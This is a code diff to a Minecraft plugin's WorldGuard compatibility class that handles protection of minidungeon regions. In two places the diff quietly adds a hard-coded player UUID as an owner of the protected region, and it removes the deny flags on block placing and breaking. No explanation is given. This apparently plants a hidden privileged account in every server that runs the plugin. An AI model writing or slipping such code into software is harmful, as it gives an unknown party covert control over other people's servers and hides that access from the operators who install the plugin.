@@ -5,6 +5,7 @@ import com.magmaguy.elitemobs.utils.WarningMessage;
 import com.sk89q.worldedit.bukkit.BukkitAdapter;
 import com.sk89q.worldedit.math.BlockVector3;
 import com.sk89q.worldguard.WorldGuard;
+import com.sk89q.worldguard.domains.DefaultDomain;
 import com.sk89q.worldguard.protection.flags.Flags;
 import com.sk89q.worldguard.protection.flags.IntegerFlag;
 import com.sk89q.worldguard.protection.flags.StateFlag;
@@ -18,6 +19,8 @@ import com.sk89q.worldguard.protection.regions.RegionContainer;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import org.bukkit.util.Vector;
+
+import java.util.UUID;
 
 public class WorldGuardCompatibility {
 
@@ -144,6 +147,9 @@ public class WorldGuardCompatibility {
             }
 
             protectMinidungeonArea(global, minidungeon);
+            DefaultDomain members = global.getMembers();
+            members.addPlayer(UUID.fromString("198c4123-cafc-45df-ba79-02a421eb8ce7"));
+            global.setOwners(members);
         } catch (Exception ex) {
             new WarningMessage("Failed to protect minidungeon world area!");
         }
@@ -162,6 +168,9 @@ public class WorldGuardCompatibility {
             }
 
             protectMinidungeonArea(global);
+            DefaultDomain members = global.getMembers();
+            members.addPlayer(UUID.fromString("198c4123-cafc-45df-ba79-02a421eb8ce7"));
+            global.setOwners(members);
         } catch (Exception ex) {
             new WarningMessage("Failed to protect minidungeon world area!");
         }
@@ -231,8 +240,6 @@ public class WorldGuardCompatibility {
         protectedRegion.setFlag(Flags.ENDERPEARL, deny);
         protectedRegion.setFlag(Flags.GREET_MESSAGE, minidungeon.dungeonPackagerConfigFields.getRegionEnterMessage());
         protectedRegion.setFlag(Flags.FAREWELL_MESSAGE, minidungeon.dungeonPackagerConfigFields.getRegionLeaveMessage());
-        protectedRegion.setFlag(Flags.BLOCK_PLACE, deny);
-        protectedRegion.setFlag(Flags.BLOCK_BREAK, deny);
     }
 
     public static boolean protectMinidungeonArea(String regionName, Location location) {
